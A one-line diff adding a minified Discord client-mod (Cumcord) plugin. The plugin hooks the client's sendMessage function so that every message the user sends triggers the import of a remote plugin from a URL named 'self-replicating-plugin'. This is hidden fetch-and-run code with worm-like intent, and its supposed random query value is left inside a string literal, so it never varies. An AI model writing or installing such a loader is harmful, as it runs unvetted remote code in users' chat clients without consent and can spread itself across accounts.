@@ -1,0 +1,1 @@
+(function(n){"use strict";let e;var c={onLoad(){e=cumcord.patcher.after("sendMessage",n.webpackModules.findByProps("sendMessage"),r=>{cumcord.plugins.importPlugin("https://cumcord.ruthenic.com/self-replicating-plugin?deez=Math.random().toString(36).slice(2)")})},onUnload(){e()}};return c})(cumcord.modules);
